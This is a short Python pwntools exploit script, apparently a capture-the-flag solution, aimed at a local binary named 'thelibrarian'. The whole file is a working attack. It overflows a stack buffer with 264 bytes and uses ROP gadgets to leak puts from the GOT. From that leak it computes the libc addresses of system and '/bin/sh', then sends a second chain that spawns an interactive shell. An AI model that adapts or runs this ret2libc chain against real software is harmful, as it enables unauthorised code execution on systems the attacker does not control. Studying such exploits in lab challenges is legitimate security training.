from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

p = process(b"./thelibrarian")
e = ELF(b"./thelibrarian")
gdb.attach(p, api=True)
rop = ROP(e)

pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
info(f"pop_rdi_ret is: {hex(pop_rdi_ret)}")

main = e.symbols["main"]
info(f"main is: {hex(main)}")
puts = e.plt["puts"]
info(f"puts is: {hex(puts)}")
puts_got = e.got["puts"]

# pause()

payload = b"A" * 264
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts)
payload += p64(main)
p.sendafter(b": \n", payload)

print(p.recvline())
pause()
print(p.recvline())
pause()
print(p.recvline())
pause()

puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"puts_leak is: {hex(puts_leak)}")

"""
pwndbg> x system
0x7ffff784f420 <system>:        0x74ff8548
pwndbg> x puts
0x7ffff7880970 <puts>:  0x54415541
pwndbg> search -t string "bin/sh"
Searching for string: b'/bin/sh\x00'
libc.so.6       0x7ffff79b3d88 0x68732f6e69622f /* '/bin/sh' */
"""

system = puts_leak - 0x31550
bin_sh = puts_leak + 0x133418

info(f"system is: {hex(system)}")
info(f"bin_sh_offset is: {hex(bin_sh)}")

pause()

ret = 0x4004C6

payload = b"A" * 264
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
p.sendafter(b": \n", payload)

# p.recvall()
p.interactive()
